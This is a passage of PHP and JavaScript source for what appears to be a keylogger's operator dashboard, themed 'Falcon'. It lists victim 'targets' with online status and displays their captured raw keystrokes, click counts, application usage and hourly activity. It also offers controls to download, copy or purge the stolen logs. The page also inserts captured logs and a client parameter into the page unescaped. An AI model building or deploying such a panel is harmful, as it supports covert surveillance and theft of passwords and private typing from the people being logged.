                                preg_match_all('/\d{4}-\d{2}-\d{2}/', $clientLogs, $dates);
                                $uniqueDates = count(array_unique($dates[0]));
                                $avgPerDay = $uniqueDates > 0 ? round($totalEvents / $uniqueDates, 1) : 0;
                                ?>
                                
                                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 15px;">
                                    <div style="text-align: center; padding: 20px; background: rgba(0, 255, 157, 0.1); border-radius: 10px; border: 1px solid var(--success);">
                                        <div style="font-size: 32px; font-weight: bold; color: var(--success);"><?php echo number_format($keyCount); ?></div>
                                        <div style="font-size: 14px;">⌨️ Keystrikes</div>
                                    </div>
                                    <div style="text-align: center; padding: 20px; background: rgba(107, 166, 255, 0.1); border-radius: 10px; border: 1px solid var(--info);">
                                        <div style="font-size: 32px; font-weight: bold; color: var(--info);"><?php echo number_format($mouseCount); ?></div>
                                        <div style="font-size: 14px;">🖱️ Clicks</div>
                                    </div>
                                    <div style="text-align: center; padding: 20px; background: rgba(212, 160, 23, 0.1); border-radius: 10px; border: 1px solid var(--primary);">
                                        <div style="font-size: 32px; font-weight: bold; color: var(--primary);"><?php echo number_format($totalEvents); ?></div>
                                        <div style="font-size: 14px;">📊 Total Strikes</div>
                                    </div>
                                    <div style="text-align: center; padding: 20px; background: rgba(255, 184, 107, 0.1); border-radius: 10px; border: 1px solid var(--warning);">
                                        <div style="font-size: 32px; font-weight: bold; color: var(--warning);"><?php echo $avgPerDay; ?></div>
                                        <div style="font-size: 14px;">📈 Avg Strikes/Day</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Timeline Tab -->
                        <div id="tab-timeline" class="tab-content">
                            <div class="window-stats" id="timelineTab">
                                <h3>⏰ Falcon Flight Path</h3>
                                <?php
                                $hourlyActivity = array_fill(0, 24, 0);
                                $lines = explode("\n", $clientLogs);
                                foreach ($lines as $line) {
                                    if (preg_match('/\] (\d{4}-\d{2}-\d{2}) (\d{2}):/', $line, $matches)) {
                                        $hour = intval($matches[2]);
                                        $hourlyActivity[$hour]++;
                                    }
                                }
                                ?>
                                
                                <div style="margin-top: 20px;">
                                    <?php for ($hour = 0; $hour < 24; $hour++): 
                                        $maxActivity = max($hourlyActivity);
                                        $height = $maxActivity > 0 ? ($hourlyActivity[$hour] / $maxActivity) * 100 : 0;
                                    ?>
                                        <div style="margin-bottom: 5px; display: flex; align-items: center;">
                                            <div style="width: 50px; font-size: 12px; color: var(--text-secondary);"><?php echo sprintf('%02d:00', $hour); ?></div>
                                            <div style="flex: 1; height: 20px; background: var(--border); border-radius: 10px; overflow: hidden;">
                                                <div style="height: 100%; width: <?php echo $height; ?>%; background: linear-gradient(90deg, var(--primary), var(--accent));"></div>
                                            </div>
                                            <div style="width: 50px; text-align: right; font-size: 12px; color: var(--text-secondary);"><?php echo $hourlyActivity[$hour]; ?></div>
                                        </div>
                                    <?php endfor; ?>
                                </div>
                            </div>
                        </div>
                        
                    <?php else: ?>
                        <div class="empty-state">
                            <div>🦅</div>
                            Select a target for the falcon to strike
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Notification -->
    <div class="notification" id="notification"></div>
    
    <script>
    // State variables
    let autoRefresh = true;
    let refreshInterval = <?php echo $refreshRate; ?>;
    let timeUntilRefresh = refreshInterval;
    let refreshTimer;
    let countdownTimer;
    let selectedClient = '<?php echo $selectedClient; ?>';
    let currentTab = 'logs';
    
    // Initialize on load
    document.addEventListener('DOMContentLoaded', function() {
        startRefreshTimer();
        startCountdown();
        
        if (selectedClient) {
            document.getElementById('downloadBtn').style.display = 'inline-block';
            document.getElementById('clearBtn').style.display = 'inline-block';
            document.getElementById('copyBtn').style.display = 'inline-block';
        }
    });
    
    // Start refresh timer
    function startRefreshTimer() {
        if (refreshTimer) clearInterval(refreshTimer);
        refreshTimer = setInterval(() => {
            if (autoRefresh) {
                fetchData();
            }
        }, refreshInterval * 1000);
    }
    
    // Start countdown timer
    function startCountdown() {
        if (countdownTimer) clearInterval(countdownTimer);
        countdownTimer = setInterval(() => {
            if (autoRefresh) {
                timeUntilRefresh--;
                if (timeUntilRefresh <= 0) {
                    timeUntilRefresh = refreshInterval;
                }
                updateCountdown();
            }
        }, 1000);
    }
    
    // Update countdown display
    function updateCountdown() {
        document.getElementById('nextRefresh').textContent = timeUntilRefresh;
        const progress = ((refreshInterval - timeUntilRefresh) / refreshInterval) * 100;
        document.getElementById('progressFill').style.width = progress + '%';
    }
    
    // Toggle auto-refresh
    function toggleAutoRefresh() {
        autoRefresh = !autoRefresh;
        const toggle = document.getElementById('refreshToggle');
        const indicator = document.getElementById('refreshIndicator');
        const progressFill = document.getElementById('progressFill');
        
        if (autoRefresh) {
            toggle.innerHTML = '⏸️ Pause Falcon Eye';
            toggle.classList.remove('paused');
            toggle.classList.add('active');
            indicator.classList.remove('paused');
            progressFill.classList.remove('paused');
            timeUntilRefresh = refreshInterval;
            startRefreshTimer();
            startCountdown();
        } else {
            toggle.innerHTML = '▶️ Resume Falcon Eye';
            toggle.classList.remove('active');
            toggle.classList.add('paused');
            indicator.classList.add('paused');
            progressFill.classList.add('paused');
            clearInterval(refreshTimer);
            clearInterval(countdownTimer);
        }
    }
    
    // Change refresh interval
    function changeRefreshInterval(seconds) {
        refreshInterval = parseInt(seconds);
        timeUntilRefresh = refreshInterval;
        document.getElementById('nextRefresh').textContent = refreshInterval;
        
        if (autoRefresh) {
            clearInterval(refreshTimer);
            clearInterval(countdownTimer);
            startRefreshTimer();
            startCountdown();
        }
    }
    
    // Manual refresh
    function manualRefresh() {
        fetchData();
        showNotification('Falcon strike synced', 'success');
    }
    
    // Fetch data via AJAX
    function fetchData() {
        const url = `ajax_handler.php?client=${encodeURIComponent(selectedClient || '')}&t=${Date.now()}`;
        
        fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                updateDashboard(data);
                showNotification('Intelligence updated', 'success');
            })
            .catch(error => {
                console.error('Error fetching data:', error);
                showNotification('Strike failed: ' + error.message, 'error');
            });
    }
    
    // Update dashboard with new data
    function updateDashboard(data) {
        document.getElementById('totalClients').textContent = data.stats.totalClients;
        document.getElementById('totalSize').textContent = data.stats.totalSize;
        document.getElementById('activeToday').textContent = data.stats.activeToday;
        document.getElementById('totalEvents').textContent = data.stats.totalEvents;
        
        document.querySelectorAll('.stat-card').forEach(card => {
            card.classList.add('updating');
            setTimeout(() => card.classList.remove('updating'), 1000);
        });
        
        updateClientList(data.clients);
        document.getElementById('lastUpdate').textContent = data.timestamp;
        
        if (selectedClient && data.clientLogs) {
            updateClientLogs(data.clientLogs, data.windowStats, data.keyCount, data.mouseCount, data.hourlyActivity);
        } else if (selectedClient && !data.clientLogs) {
            document.getElementById('logViewerContent').innerHTML = `
                <div class="empty-state">
                    <div>📄</div>
                    No intelligence available<br>
                    <small style="color: var(--text-secondary);">Waiting for falcon to strike...</small>
                </div>
            `;
        }
    }
    
    // Update client list
    function updateClientList(clients) {
        const clientList = document.getElementById('clientList');
        let html = '';
        
        if (clients.length === 0) {
            html = `
                <div class="empty-state" id="noClients">
                    <div>🦅</div>
                    No targets in sight<br>
                    <small style="color: var(--text-secondary);">Waiting for falcon to strike...</small>
                </div>
            `;
        } else {
            clients.forEach(client => {
                const isSelected = selectedClient === client.id;
                const clientIdSafe = escapeHtml(client.id).replace(/[^a-zA-Z0-9]/g, '_');
                
                html += `
                    <div class="client-item ${isSelected ? 'selected' : ''}" 
                         onclick="selectClient('${encodeURIComponent(client.id)}')"
                         data-client-id="${escapeHtml(client.id)}"
                         id="client-${clientIdSafe}">
                        <div class="client-name">🎯 ${escapeHtml(client.displayName)}</div>
                        <div class="client-meta">
                            <span class="client-time">First sight: ${escapeHtml(client.firstSeen)}</span>
                            <span class="client-time">Last strike: ${escapeHtml(client.lastSeen)}</span>
                        </div>
                        <span class="client-size">${escapeHtml(client.logSizeFormatted)}</span>
                        <span class="${client.isOnline ? 'online-indicator' : 'offline-indicator'}" 
                              title="${client.isOnline ? 'In sight' : 'Out of range'}"></span>
                    </div>
                `;
            });
        }
        
        clientList.innerHTML = html;
        filterClients();
    }
    
    // Update client logs
    function updateClientLogs(logs, windowStats, keyCount, mouseCount, hourlyActivity) {
        const totalEvents = keyCount + mouseCount;
        const uniqueDates = Object.keys(hourlyActivity).length;
        const avgPerDay = uniqueDates > 0 ? (totalEvents / uniqueDates).toFixed(1) : 0;
        
        let logsHtml = `
            <div class="tabs">
                <div class="tab ${currentTab === 'logs' ? 'active' : ''}" onclick="showTab('logs')">📝 Raw Data</div>
                <div class="tab ${currentTab === 'windows' ? 'active' : ''}" onclick="showTab('windows')">🪟 Applications (${windowStats.items.length})</div>
                <div class="tab ${currentTab === 'stats' ? 'active' : ''}" onclick="showTab('stats')">📊 Analytics</div>
                <div class="tab ${currentTab === 'timeline' ? 'active' : ''}" onclick="showTab('timeline')">⏰ Timeline</div>
            </div>
            
            <div id="tab-logs" class="tab-content ${currentTab === 'logs' ? 'active' : ''}">
                <div class="log-content" id="logContent">
                    <pre id="logData">${logs || 'No intelligence available'}</pre>
                </div>
            </div>
            
            <div id="tab-windows" class="tab-content ${currentTab === 'windows' ? 'active' : ''}">
                <div class="window-stats" id="windowStats">
                    <h3>
                        🎯 Application Usage
                        <span style="font-size: 12px; color: var(--text-secondary);">Total: ${windowStats.total} events</span>
                    </h3>
        `;
        
        if (windowStats.items.length === 0) {
            logsHtml += '<div class="empty-state">No application data available</div>';
        } else {
            windowStats.items.forEach(item => {
                logsHtml += `
                    <div class="window-item">
                        <span class="window-name">${item.name}</span>
                        <span class="window-count">${item.count} (${item.percentage}%)</span>
                    </div>
                `;
            });
        }
        
        logsHtml += `
                </div>
            </div>
            
            <div id="tab-stats" class="tab-content ${currentTab === 'stats' ? 'active' : ''}">
                <div class="window-stats" id="statisticsTab">
                    <h3>📊 Strike Analysis</h3>
                    
                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 15px;">
                        <div style="text-align: center; padding: 20px; background: rgba(0, 255, 157, 0.1); border-radius: 10px; border: 1px solid var(--success);">
                            <div style="font-size: 32px; font-weight: bold; color: var(--success);">${numberFormat(keyCount)}</div>
                            <div style="font-size: 14px;">⌨️ Keystrikes</div>
                        </div>
                        <div style="text-align: center; padding: 20px; background: rgba(107, 166, 255, 0.1); border-radius: 10px; border: 1px solid var(--info);">
                            <div style="font-size: 32px; font-weight: bold; color: var(--info);">${numberFormat(mouseCount)}</div>
                            <div style="font-size: 14px;">🖱️ Clicks</div>
                        </div>
                        <div style="text-align: center; padding: 20px; background: rgba(212, 160, 23, 0.1); border-radius: 10px; border: 1px solid var(--primary);">
                            <div style="font-size: 32px; font-weight: bold; color: var(--primary);">${numberFormat(totalEvents)}</div>
                            <div style="font-size: 14px;">📊 Total Strikes</div>
                        </div>
                        <div style="text-align: center; padding: 20px; background: rgba(255, 184, 107, 0.1); border-radius: 10px; border: 1px solid var(--warning);">
                            <div style="font-size: 32px; font-weight: bold; color: var(--warning);">${avgPerDay}</div>
                            <div style="font-size: 14px;">📈 Avg Strikes/Day</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div id="tab-timeline" class="tab-content ${currentTab === 'timeline' ? 'active' : ''}">
                <div class="window-stats" id="timelineTab">
                    <h3>⏰ Falcon Flight Path</h3>
                    <div style="margin-top: 20px;">
        `;
        
        const maxActivity = Math.max(...hourlyActivity);
        for (let hour = 0; hour < 24; hour++) {
            const height = maxActivity > 0 ? (hourlyActivity[hour] / maxActivity) * 100 : 0;
            logsHtml += `
                <div style="margin-bottom: 5px; display: flex; align-items: center;">
                    <div style="width: 50px; font-size: 12px; color: var(--text-secondary);">${hour.toString().padStart(2, '0')}:00</div>
                    <div style="flex: 1; height: 20px; background: var(--border); border-radius: 10px; overflow: hidden;">
                        <div style="height: 100%; width: ${height}%; background: linear-gradient(90deg, var(--primary), var(--accent));"></div>
                    </div>
                    <div style="width: 50px; text-align: right; font-size: 12px; color: var(--text-secondary);">${hourlyActivity[hour]}</div>
                </div>
            `;
        }
        
        logsHtml += `
                    </div>
                </div>
            </div>
        `;
        
        document.getElementById('logViewerContent').innerHTML = logsHtml;
    }
    
    // Select client
    function selectClient(clientId) {
        selectedClient = decodeURIComponent(clientId);
        
        const url = new URL(window.location);
        url.searchParams.set('client', selectedClient);
        window.history.pushState({}, '', url);
        
        document.querySelectorAll('.client-item').forEach(item => {
            item.classList.remove('selected');
        });
        
        const escapedId = escapeHtml(selectedClient).replace(/[^a-zA-Z0-9]/g, '_');
        const clientElement = document.getElementById(`client-${escapedId}`);
        if (clientElement) {
            clientElement.classList.add('selected');
        }
        
        const selectedName = document.querySelector(`.client-item.selected .client-name`);
        if (selectedName) {
            document.getElementById('selectedClientName').textContent = selectedName.textContent.replace('🎯', '').trim();
        }
        
        document.getElementById('downloadBtn').style.display = 'inline-block';
        document.getElementById('clearBtn').style.display = 'inline-block';
        document.getElementById('copyBtn').style.display = 'inline-block';
        
        document.getElementById('downloadBtn').href = `download_logs.php?client=${encodeURIComponent(selectedClient)}`;
        document.getElementById('clearBtn').setAttribute('onclick', `clearLogs('${selectedClient.replace(/'/g, "\\'")}')`);
        
        document.getElementById('logViewerContent').innerHTML = `
            <div class="empty-state">
                <div>⏳</div>
                Falcon diving on ${escapeHtml(selectedClient)}...<br>
                <small style="color: var(--text-secondary);">Please wait</small>
            </div>
        `;
        
        fetchData();
    }
    
    // Show tab
    function showTab(tabName) {
        currentTab = tabName;
        
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.classList.remove('active');
        });
        
        document.querySelectorAll('.tab').forEach(tab => {
            tab.classList.remove('active');
        });
        
        document.getElementById('tab-' + tabName).classList.add('active');
        event.target.classList.add('active');
    }
    
    // Filter clients
    function filterClients() {
        const searchText = document.getElementById('clientSearch').value.toLowerCase();
        const clients = document.querySelectorAll('.client-item');
        
        clients.forEach(client => {
            const clientId = client.getAttribute('data-client-id').toLowerCase();
            if (clientId.includes(searchText)) {
                client.style.display = 'block';
            } else {
                client.style.display = 'none';
            }
        });
    }
    
    // Clear logs
    function clearLogs(clientId) {
        if (confirm('⚠️ Are you sure you want to purge all intelligence for this target?\nThis action cannot be undone!')) {
            fetch('clear_logs.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'client=' + encodeURIComponent(clientId)
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    showNotification('✅ Intelligence purged successfully!', 'success');
                    fetchData();
                } else {
                    showNotification('❌ Error purging intelligence: ' + data.message, 'error');
                }
            })
            .catch(error => {
                showNotification('❌ Error purging intelligence: ' + error, 'error');
            });
        }
    }
    
    // Copy to clipboard
    function copyToClipboard() {
        const logData = document.getElementById('logData')?.innerText;
        if (logData) {
            navigator.clipboard.writeText(logData).then(() => {
                showNotification('✅ Intelligence copied to clipboard!', 'success');
            }).catch(err => {
                showNotification('❌ Failed to copy: ' + err, 'error');
            });
        }
    }
    
    // Show notification
    function showNotification(message, type = 'success') {
        const notification = document.getElementById('notification');
        notification.textContent = message;
        notification.className = `notification ${type}`;
        notification.classList.add('show');
        
        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    }
    
    // Escape HTML
    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    // Number format
    function numberFormat(num) {
        return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    }
    
    // Handle back/forward buttons
    window.addEventListener('popstate', function() {
        location.reload();
    });
    
    // Keyboard shortcut: Ctrl+R for manual refresh
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'r') {
            e.preventDefault();
            manualRefresh();
        }
    });
    </script>
</body>
</html>
